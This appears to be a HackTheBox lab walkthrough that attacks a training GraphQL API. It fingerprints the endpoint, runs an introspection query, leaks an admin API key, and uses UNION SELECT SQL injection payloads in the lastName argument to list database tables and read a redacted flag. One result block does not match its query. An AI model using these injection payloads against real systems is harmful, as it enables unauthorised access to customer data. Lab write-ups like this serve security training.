# HTB Attacking GraphQL

### Scenario

```
The tech company Recovera Systems has commissioned an external penetration test of its backend GraphQL API after taking its public website offline for 
maintenance in response to a recent security incident. Although the user-facing portion of the platform is temporarily disabled, the underlying GraphQL API remains fully active. 
The client wants to ensure that no vulnerabilities in its schema design, query handling, or data-exposure logic contributed to the breach or could enable future compromise once the site is restored. 
Try to apply the techniques learned in this module to identify and assess any vulnerabilities before the company re-enables the website.

```

### Walkthrough

```
$ pwd
/home/htb-ac-943240/graphw00f
```

Fingerprint the GraphQL endpoint on the target using the `-f` & `-d` and `-t`  options:

```
$ python3 main.py -f -d -t http://94.237.122.188:47951

                +-------------------+
                |     graphw00f     |
                +-------------------+
                  ***            ***
                **                  **
              **                      **
    +--------------+              +--------------+
    |    Node X    |              |    Node Y    |
    +--------------+              +--------------+
                  ***            ***
                     **        **
                       **    **
                    +------------+
                    |   Node Z   |
                    +------------+

                graphw00f - v1.2.1
          The fingerprinting tool for GraphQL
           Dolev Farhi <dolev@lethalbit.com>
  
[*] Checking http://94.237.122.188:47951
[*] Checking http://94.237.122.188:47951/
[*] Checking http://94.237.122.188:47951/api
[*] Checking http://94.237.122.188:47951/graphql
[!] Found GraphQL at http://94.237.122.188:47951/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.

```

Open Firefox and visit the /graphql endpoint on the target. 
Do information disclosure using introspection to obtain information about types, fields and queries supported by the backend:

```
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

Use graphql-voyager (https://apis.guru/graphql-voyager/) and change the schema to introspection, 
and copy and paste the output from the previous GraphQL query into graphql-voyager to parse the data:

<img width="1808" height="771" alt="image" src="https://github.com/user-attachments/assets/38389ded-1b6b-48f0-9456-ce40852df3dc" />

<img width="354" height="38" alt="image" src="https://github.com/user-attachments/assets/95e18cfe-9264-45a9-89f6-345bbe0fc80f" />
<img width="152" height="153" alt="image" src="https://github.com/user-attachments/assets/c8c53435-fe87-4a89-8249-b9da681e591f" />


Notice the activeApiKeys object, query it to obtain the API key:

Query:
```
{
  activeApiKeys {
    id
    role
    key
  }
}
```

Result:

```
{
  "data": {
    "activeApiKeys": [
      {
        "id": "QXBpS2V5T2JqZWN0OjE=",
        "role": "guest",
        "key": "fbb64ce26fbe8a8d8d6895b8e6ba21a3"
      },
      {
        "id": "QXBpS2V5T2JqZWN0OjI=",
        "role": "guest",
        "key": "9cf8622bbc9fdc78f245663e08e5b4c1"
      },
      {
        "id": "QXBpS2V5T2JqZWN0OjM=",
        "role": "admin",                             <-----------------admin
        "key": "0711a879ed751e63330a78a4b195bbad"
      }
    ]
  }
}
```

Query the allCustomers object to gain information about the customers

Query:
```
{
	allCustomers (apiKey: "0711a879ed751e63330a78a4b195bbad") {
		id
		firstName
		lastName
		address
	}
}
```

Result: 

```
{
  "data": {
    "allCustomers": [
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
        "firstName": "Antony",
        "lastName": "Blair",
        "address": "13 Hide A Way Road. Winter Park, FL 32789"
      },
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",
        "firstName": "Margaret",
        "lastName": "Liverman",
        "address": "4797 New Street. Coos Bay, OR 97420 "
      },
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6Mw==",
        "firstName": "Billy",
        "lastName": "Sawyer",
        "address": "587 Hickory Lane. Washington, DC 20017 "
      }
    ]
  }
}
```

Use the customerByName object in a GraphQL query, include the apiKey parameter, and set the lastName argument to one of the three last names that were returned from the previous query. 
Then, try injecting a single quote (') into the lastName value to see if the application is vulnerable to SQL Injection:

Query:

```
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Blair'") {
    firstName
    lastName
    address
  }
}
```

Result:

```
{
  "data": {
    "allCustomers": [
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
        "firstName": "Antony",
        "lastName": "Blair",
        "address": "13 Hide A Way Road. Winter Park, FL 32789"
      },
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",
        "firstName": "Margaret",
        "lastName": "Liverman",
        "address": "4797 New Street. Coos Bay, OR 97420 "
      },
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6Mw==",
        "firstName": "Billy",
        "lastName": "Sawyer",
        "address": "587 Hickory Lane. Washington, DC 20017 "
      }
    ]
  }
}
```

Query the number of columns using a `UNION SELECT` statement to find 4 columns matching the number of columns in the original query:

Query:

```
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Blair' UNION SELECT 1,2,3,4 -- -") {
	id
    firstName
    lastName
    address
  }
}
```

Result:

```
{
  "data": {
    "customerByName": {
      "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
      "firstName": "Antony",
      "lastName": "Blair",
      "address": "13 Hide A Way Road. Winter Park, FL 32789"
    }
  }
}
```

Query the tables in the database to find the flag table which will be an `SQL Injection`:

Query:

```
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Antony' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() -- -") {
	id
    firstName
    lastName
    address
  }
}
```

Result:

```
{
  "data": {
    "customerByName": {
      "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
      "firstName": "employee,product,flag,customer,api_key",   <----- "flag"
      "lastName": "3",
      "address": "4"
    }
  }
}
``` 

Obtain the flag in the flag table:

Query:

```
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Antony' UNION SELECT 1,2,flag,4 FROM flag-- -") {
	  id
    firstName
    lastName
    address
  }
}
```

Result:

```
{
  "data": {
    "customerByName": {
      "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
      "firstName": "2",
      "lastName": "HTB{f1dXXXXXXXXXXXXXXXXXXXa35}",
      "address": "4"
    }
  }
}
```

